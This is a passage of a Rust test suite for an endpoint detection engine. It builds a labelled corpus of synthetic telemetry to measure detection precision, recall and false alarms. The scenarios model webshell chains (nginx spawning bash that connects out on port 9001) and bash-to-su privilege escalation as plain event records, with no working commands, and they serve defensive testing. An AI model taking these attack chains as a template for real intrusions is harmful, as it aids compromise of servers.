        .find_map(|line| line.strip_prefix("host: "))
        .expect("rustc host triple line");

    let manifest_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml");
    let output = std::process::Command::new("cargo")
        .args([
            "metadata",
            "--format-version",
            "1",
            "--locked",
            "--offline",
            "--filter-platform",
            host_triple,
            "--manifest-path",
        ])
        .arg(&manifest_path)
        .output()
        .expect("run cargo metadata");

    assert!(
        output.status.success(),
        "cargo metadata failed (status={}): {}",
        output.status,
        String::from_utf8_lossy(&output.stderr)
    );

    let metadata: Metadata =
        serde_yaml::from_slice(&output.stdout).expect("parse cargo metadata JSON");
    let resolved = metadata
        .resolve
        .expect("cargo metadata resolve section is missing");

    let id_to_name: std::collections::HashMap<String, String> = metadata
        .packages
        .into_iter()
        .map(|package| (package.id, package.name))
        .collect();

    let resolved_package_names: std::collections::HashSet<String> = resolved
        .nodes
        .into_iter()
        .map(|node| {
            id_to_name
                .get(&node.id)
                .cloned()
                .unwrap_or_else(|| panic!("missing package for resolved node id: {}", node.id))
        })
        .collect();

    let blocked = ["tensorflow", "tch", "pytorch", "onnxruntime", "candle"];
    let present: Vec<&str> = blocked
        .iter()
        .copied()
        .filter(|name| resolved_package_names.contains(*name))
        .collect();

    assert!(
        present.is_empty(),
        "unexpected ML framework dependencies present in resolved graph: {}",
        present.join(", ")
    );
}

#[test]
#[cfg_attr(
    miri,
    ignore = "runtime latency assertions are not meaningful under miri"
)]
// AC-DET-091
fn detection_latency_p99_stays_within_budget_for_reference_workload() {
    let mut engine = DetectionEngine::default_with_rules();
    engine.layer1.load_hashes(["deadbeef".to_string()]);

    let mut samples_ns = Vec::new();
    for i in 0..2_000i64 {
        let mut ev = event(i, EventClass::ProcessExec, "bash", "sshd", 1000);
        if i % 200 == 0 {
            ev.file_hash = Some("deadbeef".to_string());
        }
        let started = std::time::Instant::now();
        let _ = engine.process_event(&ev);
        samples_ns.push(started.elapsed().as_nanos() as u64);
    }

    samples_ns.sort_unstable();
    let idx = ((samples_ns.len() as f64) * 0.99).ceil() as usize - 1;
    let p99 = samples_ns[idx.min(samples_ns.len() - 1)];
    assert!(p99 < std::time::Duration::from_millis(10).as_nanos() as u64);
}

#[derive(Debug, Clone, Copy)]
struct ReplayQualityMetrics {
    tp: usize,
    fp: usize,
    fn_: usize,
    benign_trials: usize,
    precision: f64,
    recall: f64,
    upper_false_alarm: f64,
}

#[derive(Debug, Clone, Copy)]
struct ReplayConfidenceThresholdMetrics {
    threshold: Confidence,
    tp: usize,
    fp: usize,
    fn_: usize,
    actual_positive: usize,
    predicted_positive: usize,
    benign_trials: usize,
    precision: f64,
    recall: f64,
    upper_false_alarm: f64,
}

#[derive(Debug, Clone)]
struct ReplayQualityCorpusMetrics {
    scenario_count: usize,
    total_events: usize,
    malicious_events: usize,
    threshold_focus: Confidence,
    focus_metrics: ReplayQualityMetrics,
    by_confidence_threshold: Vec<ReplayConfidenceThresholdMetrics>,
}

impl ReplayQualityCorpusMetrics {
    fn threshold_metrics(
        &self,
        threshold: Confidence,
    ) -> Option<&ReplayConfidenceThresholdMetrics> {
        self.by_confidence_threshold
            .iter()
            .find(|metrics| metrics.threshold == threshold)
    }
}

#[derive(Debug, Clone)]
struct LabeledReplayEvent {
    event: TelemetryEvent,
    expected_min_confidence: Option<Confidence>,
}

fn labeled_event(
    event: TelemetryEvent,
    expected_min_confidence: Option<Confidence>,
) -> LabeledReplayEvent {
    LabeledReplayEvent {
        event,
        expected_min_confidence,
    }
}

fn confidence_rank(confidence: Confidence) -> u8 {
    match confidence {
        Confidence::Definite => 0,
        Confidence::VeryHigh => 1,
        Confidence::High => 2,
        Confidence::Medium => 3,
        Confidence::Low => 4,
        Confidence::None => 5,
    }
}

fn confidence_meets_threshold(confidence: Confidence, threshold: Confidence) -> bool {
    confidence_rank(confidence) <= confidence_rank(threshold)
}

fn confidence_label(confidence: Confidence) -> &'static str {
    match confidence {
        Confidence::Definite => "definite",
        Confidence::VeryHigh => "very_high",
        Confidence::High => "high",
        Confidence::Medium => "medium",
        Confidence::Low => "low",
        Confidence::None => "none",
    }
}

fn false_alarm_upper_bound(fp: usize, benign_trials: usize) -> f64 {
    if benign_trials == 0 {
        return 0.0;
    }

    if fp == 0 {
        return 1.0 - 0.05f64.powf(1.0 / benign_trials as f64);
    }

    1.0
}

fn is_expected_positive(
    expected_min_confidence: Option<Confidence>,
    threshold: Confidence,
) -> bool {
    expected_min_confidence
        .map(|expected| confidence_meets_threshold(expected, threshold))
        .unwrap_or(false)
}

fn is_predicted_positive(predicted: Option<Confidence>, threshold: Confidence) -> bool {
    predicted
        .map(|confidence| confidence_meets_threshold(confidence, threshold))
        .unwrap_or(false)
}

fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
    let mut corpus = Vec::new();

    // Scenario 1: exact IOC detections mixed with benign process activity.
    for i in 0..30i64 {
        let mut ev = event(i, EventClass::ProcessExec, "bash", "sshd", 1000);
        ev.pid = 10_000 + i as u32;
        ev.session_id = ev.pid;

        if i % 10 == 0 {
            ev.file_hash = Some("deadbeef".to_string());
            corpus.push(labeled_event(ev, Some(Confidence::Definite)));
        } else {
            corpus.push(labeled_event(ev, None));
        }
    }

    // Scenario 2: temporal privilege escalation chains with near-miss adversarial variants.
    for seq in 0..3i64 {
        let base = 1_000 + seq * 40;
        let pid = 20_000 + seq as u32;

        let mut stage1 = event(base, EventClass::ProcessExec, "bash", "sshd", 1000);
        stage1.pid = pid;
        stage1.session_id = stage1.pid;
        corpus.push(labeled_event(stage1, None));

        let mut stage2 = event(base + 5, EventClass::ProcessExec, "su", "bash", 0);
        stage2.pid = pid;
        stage2.session_id = stage2.pid;
        corpus.push(labeled_event(stage2, Some(Confidence::High)));

        let miss_pid = 21_000 + seq as u32;
        let mut miss_stage1 = event(base + 10, EventClass::ProcessExec, "bash", "sshd", 1000);
        miss_stage1.pid = miss_pid;
        miss_stage1.session_id = miss_stage1.pid;
        corpus.push(labeled_event(miss_stage1, None));

        let mut miss_stage2 = event(base + 35, EventClass::ProcessExec, "su", "bash", 0);
        miss_stage2.pid = miss_pid;
        miss_stage2.session_id = miss_stage2.pid;
        corpus.push(labeled_event(miss_stage2, None));
    }

    // Scenario 3: dual-signal webshell chains (temporal + killchain) and close benign lookalikes.
    for seq in 0..2i64 {
        let base = 2_000 + seq * 60;
        let parent_pid = 30_000 + (seq as u32) * 20;
        let child_pid = parent_pid + 1;

        let mut parent = event(base, EventClass::ProcessExec, "nginx", "systemd", 33);
        parent.pid = parent_pid;
        parent.ppid = 1;
        parent.session_id = parent.pid;
        corpus.push(labeled_event(parent, None));

        let mut child = event(base + 2, EventClass::ProcessExec, "bash", "nginx", 33);
        child.pid = child_pid;
        child.ppid = parent_pid;
        child.session_id = child.pid;
        corpus.push(labeled_event(child, None));

        let mut net = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 33);
        net.pid = child_pid;
        net.ppid = parent_pid;
        net.session_id = net.pid;
        net.dst_port = Some(9001);
        corpus.push(labeled_event(net, Some(Confidence::VeryHigh)));

        let benign_parent_pid = parent_pid + 10;
        let benign_child_pid = benign_parent_pid + 1;

        let mut benign_parent = event(base + 20, EventClass::ProcessExec, "nginx", "systemd", 33);
        benign_parent.pid = benign_parent_pid;
        benign_parent.ppid = 1;
        benign_parent.session_id = benign_parent.pid;
        corpus.push(labeled_event(benign_parent, None));

        let mut benign_child = event(base + 22, EventClass::ProcessExec, "bash", "nginx", 33);
        benign_child.pid = benign_child_pid;
        benign_child.ppid = benign_parent_pid;
        benign_child.session_id = benign_child.pid;
        corpus.push(labeled_event(benign_child, None));

        let mut benign_net = event(base + 25, EventClass::NetworkConnect, "bash", "nginx", 33);
        benign_net.pid = benign_child_pid;
        benign_net.ppid = benign_parent_pid;
        benign_net.session_id = benign_net.pid;
        benign_net.dst_port = Some(443);
        corpus.push(labeled_event(benign_net, None));
    }

    // Scenario 4: benign noisy telemetry across classes (adversarial pressure without true threats).
    for i in 0..24i64 {
        let class = match i % 4 {
            0 => EventClass::FileOpen,
            1 => EventClass::NetworkConnect,
            2 => EventClass::DnsQuery,
            _ => EventClass::ModuleLoad,
        };

        let mut ev = event(3_000 + i, class, "agentd", "systemd", 1000);
        ev.pid = 40_000 + i as u32;
        ev.session_id = ev.pid;

        match class {
            EventClass::FileOpen => {
                ev.file_path = Some("/var/log/eguard-agent/telemetry.log".to_string());
            }
            EventClass::NetworkConnect => {
                ev.dst_port = Some(443);
                ev.dst_ip = Some("203.0.113.20".to_string());
            }
            EventClass::DnsQuery => {
                ev.dst_domain = Some("updates.example.org".to_string());
            }
            EventClass::ModuleLoad => {
                ev.file_path = Some("/lib/modules/normal_observer.ko".to_string());
            }
            _ => {}
        }

        corpus.push(labeled_event(ev, None));
    }

    // Scenario 5: PID reuse after a malicious chain must not inherit stale Layer4 state.
    for seq in 0..2i64 {
        let base = 4_000 + seq * 40;
        let parent_pid = 50_000 + (seq as u32) * 10;
        let child_pid = parent_pid + 1;

        let mut parent = event(base, EventClass::ProcessExec, "nginx", "systemd", 33);
        parent.pid = parent_pid;
        parent.ppid = 1;
        parent.session_id = parent.pid;
        corpus.push(labeled_event(parent, None));

        let mut child = event(base + 2, EventClass::ProcessExec, "bash", "nginx", 33);
        child.pid = child_pid;
        child.ppid = parent_pid;
        child.session_id = child.pid;
        corpus.push(labeled_event(child, None));

        let mut malicious_net = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 33);
        malicious_net.pid = child_pid;
        malicious_net.ppid = parent_pid;
        malicious_net.session_id = malicious_net.pid;
        malicious_net.dst_port = Some(9001);
        corpus.push(labeled_event(malicious_net, Some(Confidence::VeryHigh)));

        let mut reused_pid_exec = event(base + 20, EventClass::ProcessExec, "bash", "nginx", 33);
        reused_pid_exec.pid = child_pid;
        reused_pid_exec.ppid = parent_pid;
        reused_pid_exec.session_id = reused_pid_exec.pid;
        corpus.push(labeled_event(reused_pid_exec, None));

        let mut benign_net = event(base + 22, EventClass::NetworkConnect, "bash", "nginx", 33);
        benign_net.pid = child_pid;
        benign_net.ppid = parent_pid;
        benign_net.session_id = benign_net.pid;
        benign_net.dst_port = Some(443);
        corpus.push(labeled_event(benign_net, None));
    }

    // Scenario 6: L2 stale pending stage must be cleared when pid is reused with a new exec image.
    for seq in 0..2i64 {
        let base = 5_000 + seq * 40;
        let pid = 60_000 + seq as u32;

        let mut stale_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
        stale_stage1.pid = pid;
        stale_stage1.ppid = 1;
        stale_stage1.session_id = stale_stage1.pid;
        corpus.push(labeled_event(stale_stage1, None));

        let mut reused_exec = event(base + 3, EventClass::ProcessExec, "python", "systemd", 1000);
        reused_exec.pid = pid;
        reused_exec.ppid = 1;
        reused_exec.session_id = reused_exec.pid;
        corpus.push(labeled_event(reused_exec, None));

        let mut stale_followup = event(
            base + 6,
            EventClass::NetworkConnect,
            "python",
            "systemd",
            1000,
        );
        stale_followup.pid = pid;
        stale_followup.ppid = 1;
        stale_followup.session_id = stale_followup.pid;
        stale_followup.dst_port = Some(9001);
        corpus.push(labeled_event(stale_followup, None));
    }

    // Scenario 7: timestamp-skewed restart attempts beyond reorder tolerance must be ignored.
    for seq in 0..2i64 {
        let base = 6_000 + seq * 40;
        let pid = 70_000 + seq as u32;

        let mut first_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
        first_stage1.pid = pid;
        first_stage1.ppid = 1;
        first_stage1.session_id = first_stage1.pid;
        corpus.push(labeled_event(first_stage1, None));

        let mut skewed_restart = event(base - 50, EventClass::ProcessExec, "bash", "nginx", 33);
        skewed_restart.pid = pid;
        skewed_restart.ppid = 1;
        skewed_restart.session_id = skewed_restart.pid;
        corpus.push(labeled_event(skewed_restart, None));

        let mut skewed_followup = event(base - 45, EventClass::NetworkConnect, "bash", "nginx", 33);
        skewed_followup.pid = pid;
        skewed_followup.ppid = 1;
        skewed_followup.session_id = skewed_followup.pid;
        skewed_followup.dst_port = Some(9001);
        corpus.push(labeled_event(skewed_followup, None));

        let mut fresh_stage1 = event(base + 5, EventClass::ProcessExec, "bash", "nginx", 33);
        fresh_stage1.pid = pid;
        fresh_stage1.ppid = 1;
        fresh_stage1.session_id = fresh_stage1.pid;
        corpus.push(labeled_event(fresh_stage1, None));

        let mut fresh_stage2 = event(base + 8, EventClass::NetworkConnect, "bash", "nginx", 33);
        fresh_stage2.pid = pid;
        fresh_stage2.ppid = 1;
        fresh_stage2.session_id = fresh_stage2.pid;
        fresh_stage2.dst_port = Some(9001);
        corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
    }

    // Scenario 8: PID reuse without an observed exec must not carry stale pending stage via identity drift.
    for seq in 0..2i64 {
        let base = 7_000 + seq * 40;
        let pid = 80_000 + seq as u32;

        let mut stale_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
        stale_stage1.pid = pid;
        stale_stage1.ppid = 1;
        stale_stage1.session_id = stale_stage1.pid;
        corpus.push(labeled_event(stale_stage1, None));

        let mut identity_drift_followup = event(
            base + 4,
            EventClass::NetworkConnect,
            "python",
            "systemd",
            1000,
        );
        identity_drift_followup.pid = pid;
        identity_drift_followup.ppid = 1;
        identity_drift_followup.session_id = identity_drift_followup.pid;
        identity_drift_followup.dst_port = Some(9001);
        corpus.push(labeled_event(identity_drift_followup, None));

        let mut fresh_stage1 = event(base + 8, EventClass::ProcessExec, "bash", "nginx", 33);
        fresh_stage1.pid = pid;
        fresh_stage1.ppid = 1;
        fresh_stage1.session_id = fresh_stage1.pid;
        corpus.push(labeled_event(fresh_stage1, None));

        let mut fresh_stage2 = event(base + 11, EventClass::NetworkConnect, "bash", "nginx", 33);
        fresh_stage2.pid = pid;
        fresh_stage2.ppid = 1;
        fresh_stage2.session_id = fresh_stage2.pid;
        fresh_stage2.dst_port = Some(9001);
        corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
    }

    // Scenario 9: stale per-pid temporal state/metadata must age out under long-horizon churn.
    for seq in 0..2i64 {
        let base = 8_000 + seq * 100;
        let pid = 90_000 + seq as u32;

        let mut stale_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 33);
        stale_stage1.pid = pid;
        stale_stage1.ppid = 1;
        stale_stage1.session_id = stale_stage1.pid;
        corpus.push(labeled_event(stale_stage1, None));

        let mut horizon_advance =
            event(base + 500, EventClass::FileOpen, "python", "systemd", 1000);
        horizon_advance.pid = pid + 1;
        horizon_advance.ppid = 1;
        horizon_advance.session_id = horizon_advance.pid;
        horizon_advance.file_path = Some("/tmp/harmless.log".to_string());
        corpus.push(labeled_event(horizon_advance, None));

        let mut stale_followup = event(base + 505, EventClass::NetworkConnect, "bash", "nginx", 33);
        stale_followup.pid = pid;
        stale_followup.ppid = 1;
        stale_followup.session_id = stale_followup.pid;
        stale_followup.dst_port = Some(9001);
        corpus.push(labeled_event(stale_followup, None));

        let mut fresh_stage1 = event(base + 510, EventClass::ProcessExec, "bash", "nginx", 33);
        fresh_stage1.pid = pid;
        fresh_stage1.ppid = 1;
        fresh_stage1.session_id = fresh_stage1.pid;
        corpus.push(labeled_event(fresh_stage1, None));

        let mut fresh_stage2 = event(base + 513, EventClass::NetworkConnect, "bash", "nginx", 33);
        fresh_stage2.pid = pid;
        fresh_stage2.ppid = 1;
        fresh_stage2.session_id = fresh_stage2.pid;
        fresh_stage2.dst_port = Some(9001);
        corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
    }

    // Scenario 10: timestamp-tie state-cap pressure must evict oldest/lowest pid chains deterministically.
    for seq in 0..2i64 {
        let base = 9_000 + seq * 200;
        let start_pid = 100_000 + (seq as u32) * 1_000;

        for offset in 0..220u32 {
            let mut tied_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 0);
            tied_stage1.pid = start_pid + offset;
            tied_stage1.ppid = 1;
            tied_stage1.session_id = tied_stage1.pid;
            corpus.push(labeled_event(tied_stage1, None));
        }

        let mut evicted_followup = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 0);
        evicted_followup.pid = start_pid;
        evicted_followup.ppid = 1;
        evicted_followup.session_id = evicted_followup.pid;
        evicted_followup.dst_port = Some(9001);
        corpus.push(labeled_event(evicted_followup, None));

        let mut retained_followup = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 0);
        retained_followup.pid = start_pid + 219;
        retained_followup.ppid = 1;
        retained_followup.session_id = retained_followup.pid;
        retained_followup.dst_port = Some(9001);
        corpus.push(labeled_event(retained_followup, Some(Confidence::High)));
    }

    // Scenario 11: combined cap-pressure + reorder-skew abuse must not revive stale chains.
    for seq in 0..2i64 {
        let base = 10_000 + seq * 300;
        let victim_pid = 110_000 + (seq as u32) * 1_000;

        let mut victim_stage1 = event(base, EventClass::ProcessExec, "bash", "nginx", 0);
        victim_stage1.pid = victim_pid;
        victim_stage1.ppid = 1;
        victim_stage1.session_id = victim_stage1.pid;
        corpus.push(labeled_event(victim_stage1, None));

        for offset in 0..220u32 {
            let mut pressure_stage1 = event(base + 1, EventClass::ProcessExec, "bash", "nginx", 0);
            pressure_stage1.pid = victim_pid + 10 + offset;
            pressure_stage1.ppid = 1;
            pressure_stage1.session_id = pressure_stage1.pid;
            corpus.push(labeled_event(pressure_stage1, None));
        }

        let mut skewed_restart = event(base - 20, EventClass::ProcessExec, "bash", "nginx", 0);
        skewed_restart.pid = victim_pid;
        skewed_restart.ppid = 1;
        skewed_restart.session_id = skewed_restart.pid;
        corpus.push(labeled_event(skewed_restart, None));

        let mut skewed_followup = event(base - 15, EventClass::NetworkConnect, "bash", "nginx", 0);
        skewed_followup.pid = victim_pid;
        skewed_followup.ppid = 1;
        skewed_followup.session_id = skewed_followup.pid;
        skewed_followup.dst_port = Some(9001);
        corpus.push(labeled_event(skewed_followup, None));

        let mut fresh_stage1 = event(base + 10, EventClass::ProcessExec, "bash", "nginx", 0);
        fresh_stage1.pid = victim_pid;
        fresh_stage1.ppid = 1;
        fresh_stage1.session_id = fresh_stage1.pid;
        corpus.push(labeled_event(fresh_stage1, None));

        let mut fresh_stage2 = event(base + 13, EventClass::NetworkConnect, "bash", "nginx", 0);
        fresh_stage2.pid = victim_pid;
        fresh_stage2.ppid = 1;
        fresh_stage2.session_id = fresh_stage2.pid;
        fresh_stage2.dst_port = Some(9001);
        corpus.push(labeled_event(fresh_stage2, Some(Confidence::High)));
    }

    // Scenario 12: cross-layer churn with process-exit + pid reuse must not leak stale L2/L4 state.
    for seq in 0..2i64 {
        let base = 11_000 + seq * 200;
        let parent_pid = 120_000 + (seq as u32) * 100;
        let child_pid = parent_pid + 1;

        let mut parent = event(base, EventClass::ProcessExec, "nginx", "systemd", 33);
        parent.pid = parent_pid;
        parent.ppid = 1;
        parent.session_id = parent.pid;
        corpus.push(labeled_event(parent, None));

        let mut child = event(base + 2, EventClass::ProcessExec, "bash", "nginx", 33);
        child.pid = child_pid;
        child.ppid = parent_pid;
        child.session_id = child.pid;
        corpus.push(labeled_event(child, None));

        let mut malicious_net = event(base + 5, EventClass::NetworkConnect, "bash", "nginx", 33);
        malicious_net.pid = child_pid;
        malicious_net.ppid = parent_pid;
        malicious_net.session_id = malicious_net.pid;
        malicious_net.dst_port = Some(9001);
        corpus.push(labeled_event(malicious_net, Some(Confidence::VeryHigh)));

        let mut exit = event(base + 6, EventClass::ProcessExit, "bash", "nginx", 33);
        exit.pid = child_pid;
        exit.ppid = parent_pid;
        exit.session_id = exit.pid;
        corpus.push(labeled_event(exit, None));

        let mut reused_exec = event(base + 8, EventClass::ProcessExec, "python", "systemd", 1000);
        reused_exec.pid = child_pid;
        reused_exec.ppid = 1;
        reused_exec.session_id = reused_exec.pid;
        corpus.push(labeled_event(reused_exec, None));

        let mut stale_net = event(
            base + 10,
            EventClass::NetworkConnect,
            "python",
            "systemd",
            1000,
        );
        stale_net.pid = child_pid;
        stale_net.ppid = 1;
        stale_net.session_id = stale_net.pid;
        stale_net.dst_port = Some(9001);
        corpus.push(labeled_event(stale_net, None));

        let fresh_parent_pid = parent_pid + 10;
        let mut fresh_parent = event(base + 12, EventClass::ProcessExec, "nginx", "systemd", 33);
        fresh_parent.pid = fresh_parent_pid;
        fresh_parent.ppid = 1;
        fresh_parent.session_id = fresh_parent.pid;
        corpus.push(labeled_event(fresh_parent, None));

        let mut fresh_child = event(base + 13, EventClass::ProcessExec, "bash", "nginx", 33);
        fresh_child.pid = child_pid;
        fresh_child.ppid = fresh_parent_pid;
        fresh_child.session_id = fresh_child.pid;
        corpus.push(labeled_event(fresh_child, None));

        let mut fresh_net = event(base + 16, EventClass::NetworkConnect, "bash", "nginx", 33);
        fresh_net.pid = child_pid;
        fresh_net.ppid = fresh_parent_pid;
        fresh_net.session_id = fresh_net.pid;
        fresh_net.dst_port = Some(9001);
        corpus.push(labeled_event(fresh_net, Some(Confidence::VeryHigh)));
    }

    (corpus, 12)
}

fn replay_quality_metrics_for_adversarial_corpus() -> ReplayQualityCorpusMetrics {
    let (labeled_events, scenario_count) = build_adversarial_replay_corpus();

    let mut engine = DetectionEngine::new(
        IocLayer1::new(),
        TemporalEngine::with_default_rules_and_capacity_for_test(192, 4_096),
        AnomalyEngine::default(),
        Layer4Engine::with_default_templates(),
    );
    engine.layer1.load_hashes(["deadbeef".to_string()]);

    let events: Vec<TelemetryEvent> = labeled_events
        .iter()
        .map(|entry| entry.event.clone())
        .collect();
    let summary = replay_events(&mut engine, &events);

    let predicted_by_index: std::collections::HashMap<usize, Confidence> = summary
        .alerts
        .iter()
        .map(|alert| (alert.index, alert.confidence))
        .collect();

    let thresholds = [
        Confidence::Definite,
        Confidence::VeryHigh,
        Confidence::High,
        Confidence::Medium,
        Confidence::Low,
    ];

    let mut by_confidence_threshold = Vec::with_capacity(thresholds.len());
    for threshold in thresholds {
        let mut tp = 0usize;
        let mut fp = 0usize;
        let mut fn_ = 0usize;
        let mut actual_positive = 0usize;
        let mut predicted_positive = 0usize;

        for (index, labeled) in labeled_events.iter().enumerate() {
            let actual = is_expected_positive(labeled.expected_min_confidence, threshold);
            let predicted =
                is_predicted_positive(predicted_by_index.get(&index).copied(), threshold);

            if actual {
                actual_positive = actual_positive.saturating_add(1);
            }
            if predicted {
                predicted_positive = predicted_positive.saturating_add(1);
            }

            match (actual, predicted) {
                (true, true) => tp = tp.saturating_add(1),
                (false, true) => fp = fp.saturating_add(1),
                (true, false) => fn_ = fn_.saturating_add(1),
                (false, false) => {}
            }
        }

        let benign_trials = labeled_events.len().saturating_sub(actual_positive);
        let precision = if predicted_positive == 0 {
            if actual_positive == 0 {
                1.0
            } else {
                0.0
            }
        } else {
            tp as f64 / predicted_positive as f64
        };
        let recall = if actual_positive == 0 {
            1.0
        } else {
            tp as f64 / actual_positive as f64
        };
        let upper_false_alarm = false_alarm_upper_bound(fp, benign_trials);

        by_confidence_threshold.push(ReplayConfidenceThresholdMetrics {
            threshold,
            tp,
            fp,
            fn_,
            actual_positive,
            predicted_positive,
            benign_trials,
            precision,
            recall,
            upper_false_alarm,
        });
    }

    let threshold_focus = Confidence::VeryHigh;
    let focus = by_confidence_threshold
        .iter()
        .find(|metrics| metrics.threshold == threshold_focus)
        .expect("focus threshold metrics")
        .to_owned();

    ReplayQualityCorpusMetrics {
        scenario_count,
        total_events: labeled_events.len(),
        malicious_events: labeled_events
            .iter()
            .filter(|entry| entry.expected_min_confidence.is_some())
            .count(),
        threshold_focus,
        focus_metrics: ReplayQualityMetrics {
            tp: focus.tp,
            fp: focus.fp,
            fn_: focus.fn_,
            benign_trials: focus.benign_trials,
            precision: focus.precision,
            recall: focus.recall,
            upper_false_alarm: focus.upper_false_alarm,
        },
        by_confidence_threshold,
    }
}

#[test]
#[cfg_attr(
    miri,
    ignore = "adversarial replay quality corpus is too slow under miri"
)]
// AC-DET-093 AC-DET-094
fn replay_reports_precision_recall_and_false_alarm_upper_bound_by_confidence() {
    let metrics = replay_quality_metrics_for_adversarial_corpus();
    assert!(metrics.scenario_count >= 12);
    assert!(metrics.total_events >= 60);
    assert!(metrics.malicious_events >= 5);

    for threshold in [Confidence::Definite, Confidence::VeryHigh, Confidence::High] {
        let class_metrics = metrics
            .threshold_metrics(threshold)
            .expect("threshold metrics should exist");
        assert!(
            class_metrics.precision >= 0.99,
            "precision below threshold for {}: {}",
            confidence_label(threshold),
            class_metrics.precision
        );
        assert!(
            class_metrics.recall >= 0.99,
            "recall below threshold for {}: {}",
            confidence_label(threshold),
            class_metrics.recall
        );
        assert!(
            class_metrics.upper_false_alarm <= 0.20,
            "false alarm upper bound too high for {}: {}",
            confidence_label(threshold),
            class_metrics.upper_false_alarm
        );
    }
}

#[test]
#[cfg_attr(
    miri,
    ignore = "artifact-writing replay quality gate is too slow under miri"
)]
// AC-DET-093 AC-DET-094
fn replay_quality_gate_emits_metrics_artifact() {
    use std::fmt::Write as _;

    let metrics = replay_quality_metrics_for_adversarial_corpus();
    let focus = metrics.focus_metrics;

    assert!(focus.precision >= 0.99);
    assert!(focus.recall >= 0.99);
    assert!(focus.upper_false_alarm <= 0.20);

    let repo_root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..");
    let out_dir = repo_root.join("artifacts/detection-quality-gate");
    std::fs::create_dir_all(&out_dir).expect("create detection quality artifact dir");

    let out_json = out_dir.join("metrics.json");
    let mut payload = String::new();

    writeln!(&mut payload, "{{").expect("write json header");
    writeln!(&mut payload, r#"  "suite": "detection_quality_gate","#).expect("write suite");
    writeln!(&mut payload, r#"  "thresholds": {{"#).expect("write thresholds header");
    writeln!(&mut payload, r#"    "precision_min": 0.99,"#).expect("write precision threshold");
    writeln!(&mut payload, r#"    "recall_min": 0.99,"#).expect("write recall threshold");
    writeln!(&mut payload, r#"    "false_alarm_upper_max": 0.20,"#).expect("write far threshold");
    writeln!(&mut payload, r#"    "minimum_scenarios": 12"#).expect("write scenario threshold");
    writeln!(&mut payload, "  }},").expect("close thresholds");

    writeln!(&mut payload, r#"  "corpus": {{"#).expect("write corpus header");
    writeln!(&mut payload, r#"    "name": "adversarial_reference_v2","#)
        .expect("write corpus name");
    writeln!(
        &mut payload,
        r#"    "scenario_count": {},"#,
        metrics.scenario_count
    )
    .expect("write scenario count");
    writeln!(
        &mut payload,
        r#"    "total_events": {},"#,
        metrics.total_events
    )
    .expect("write total events");
    writeln!(
        &mut payload,
        r#"    "malicious_events": {}"#,
        metrics.malicious_events
    )
    .expect("write malicious events");
    writeln!(&mut payload, "  }},").expect("close corpus");

    writeln!(&mut payload, r#"  "measured": {{"#).expect("write measured header");
    writeln!(
        &mut payload,
        r#"    "threshold_focus": "{}","#,
        confidence_label(metrics.threshold_focus)
    )
    .expect("write threshold focus");
    writeln!(&mut payload, r#"    "tp": {},"#, focus.tp).expect("write tp");
    writeln!(&mut payload, r#"    "fp": {},"#, focus.fp).expect("write fp");
    writeln!(&mut payload, r#"    "fn": {},"#, focus.fn_).expect("write fn");
    writeln!(
        &mut payload,
        r#"    "benign_trials": {},"#,
        focus.benign_trials
    )
    .expect("write benign trials");
    writeln!(&mut payload, r#"    "precision": {:.6},"#, focus.precision).expect("write precision");
    writeln!(&mut payload, r#"    "recall": {:.6},"#, focus.recall).expect("write recall");
    writeln!(
        &mut payload,
        r#"    "false_alarm_upper_bound": {:.6},"#,
        focus.upper_false_alarm
    )
    .expect("write false alarm upper bound");
    writeln!(&mut payload, r#"    "by_confidence_threshold": {{"#)
        .expect("write by confidence header");

    for (index, class_metrics) in metrics.by_confidence_threshold.iter().enumerate() {
        let suffix = if index + 1 == metrics.by_confidence_threshold.len() {
            ""
        } else {
            ","
        };

        writeln!(
            &mut payload,
            r#"      "{}": {{"#,
            confidence_label(class_metrics.threshold)
        )
        .expect("write class name");
        writeln!(&mut payload, r#"        "tp": {},"#, class_metrics.tp).expect("write class tp");
        writeln!(&mut payload, r#"        "fp": {},"#, class_metrics.fp).expect("write class fp");
        writeln!(&mut payload, r#"        "fn": {},"#, class_metrics.fn_).expect("write class fn");
        writeln!(
            &mut payload,
            r#"        "actual_positive": {},"#,
            class_metrics.actual_positive
        )
        .expect("write class actual positive");
        writeln!(
            &mut payload,
            r#"        "predicted_positive": {},"#,
            class_metrics.predicted_positive
        )
        .expect("write class predicted positive");
        writeln!(
            &mut payload,
            r#"        "benign_trials": {},"#,
            class_metrics.benign_trials
        )
        .expect("write class benign trials");
        writeln!(
            &mut payload,
            r#"        "precision": {:.6},"#,
            class_metrics.precision
        )
        .expect("write class precision");
        writeln!(
            &mut payload,
            r#"        "recall": {:.6},"#,
            class_metrics.recall
        )
        .expect("write class recall");
        writeln!(
            &mut payload,
            r#"        "false_alarm_upper_bound": {:.6}"#,
            class_metrics.upper_false_alarm
        )
        .expect("write class far upper bound");
        writeln!(&mut payload, "      }}{}", suffix).expect("close class block");
    }

    writeln!(&mut payload, "    }}").expect("close by confidence block");
    writeln!(&mut payload, "  }}").expect("close measured block");
    writeln!(&mut payload, "}}").expect("close json");

    std::fs::write(&out_json, payload).expect("write detection quality metrics");
    println!(
        "wrote detection quality gate metrics to {}",
        out_json.display()
    );
}

#[test]
// AC-DET-035 AC-DET-036 AC-DET-037 AC-DET-038 AC-DET-087
fn calibration_threshold_matches_sanov_bound() {
    let n = 512;
    let k = 12;
    let delta = 1e-6;

    let tau = tau_delta(n, k, delta).expect("tau_delta");
    let bound = sanov_upper_bound(n, k, tau).expect("sanov upper bound");
    assert!(bound <= delta * 1.10);

    let calibration = calibrate_thresholds(n, k, delta, 1e-4, 0.20, 0.10).expect("calibrate");
    assert!(calibration.tau_high >= calibration.tau_delta_high);
    assert!(calibration.tau_med >= calibration.tau_delta_med);
}

#[test]
